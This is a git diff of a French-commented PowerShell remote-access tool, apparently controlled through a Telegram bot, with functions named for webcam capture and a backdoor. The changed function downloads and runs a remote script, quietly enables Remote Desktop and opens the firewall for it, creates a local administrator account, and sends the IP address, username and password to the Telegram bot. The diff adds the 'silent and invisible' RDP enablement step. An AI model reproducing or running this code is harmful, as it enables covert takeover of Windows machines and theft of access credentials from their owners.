@@ -136,7 +136,7 @@ function webcam {
 
 function CreeAdmin {
 	# Télécharger un script depuis une URL spécifiée et l'enregistrer sur le disque local
-	$scriptPath = "C:\Users\$env:username\Documents\NewUser.ps1"
+	$scriptPath = "C:\Users\$env:username\Documents\test.ps1"
 	Invoke-WebRequest -Uri $ScriptAdmin -OutFile $scriptPath
 
 	Send-Message -Message "✅ Téléchargement Terminé..."
@@ -148,6 +148,31 @@ function CreeAdmin {
 
 	Send-Message -Message "✅ Script exécuté."
 
+	# Vérifier, implémenter et activer le protocole RDP si nécessaire
+	$IsRdpPresent = Get-WindowsOptionalFeature -Online -FeatureName 'RemoteDesktopServices' | Where-Object { $_.FeatureName -eq 'RemoteDesktopServices' }
+	$IsRdpEnabled = (Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections").fDenyTSConnections -eq 0
+
+	if ($IsRdpPresent) {
+		if (-not $IsRdpEnabled) {
+			# Activer l'accès RDP en mode silencieux et invisible
+			Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+			Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+			Send-Message -Message "✅ Accès RDP activé."
+		} else {
+			Send-Message -Message "✅ RDP est déjà activé."
+		}
+	} else {
+		# Implémenter et activer le protocole RDP
+		try {
+			Enable-WindowsOptionalFeature -Online -FeatureName 'RemoteDesktopServices'
+			Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
+			Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+			Send-Message -Message "✅ Accès RDP implémenté et activé."
+		} catch {
+			Send-Message -Message "❌ Erreur lors de l'implémentation et de l'activation du protocole RDP."
+		}
+	}
+
 	# Créer le compte utilisateur
 	$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
 	New-LocalUser -Name $Username -Password $SecurePassword -FullName "Administrateur" -Description "Compte administrateur créé par script" -PasswordNeverExpires
@@ -157,11 +182,6 @@ function CreeAdmin {
 	Add-LocalGroupMember -Group "Administrateurs" -Member $Username
 	Send-Message -Message "✅ Utilisateur ajouté au groupe Administrateurs."
 
-	# Activer l'accès RDP
-	Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
-	Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-	Send-Message -Message "✅ Accès RDP activé."
-
 	# Récupérer l'adresse IP
 	$IpAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.AddressFamily -eq "IPv4" }).IPAddress
 	Send-Message -Message "✅ Adresse IP récupérée."
@@ -169,9 +189,9 @@ function CreeAdmin {
 	# Envoyer les informations d'accès RDP au bot Telegram
 	$RdpAccessMessage = "Accès RDP :`nAdresse IP : $IpAddress`nNom d'utilisateur : $Username`nMot de passe : $Password"
 	Send-Message -Message $RdpAccessMessage
-	
-	            # Réafficher le menu
-    Send-Message -Message $messageRetour -ReplyMarkup $menuKeyboard
+
+	# Réafficher le menu
+	Send-Message -Message $messageRetour -ReplyMarkup $menuKeyboard
 }
 
 function Invoke-BackDoor {
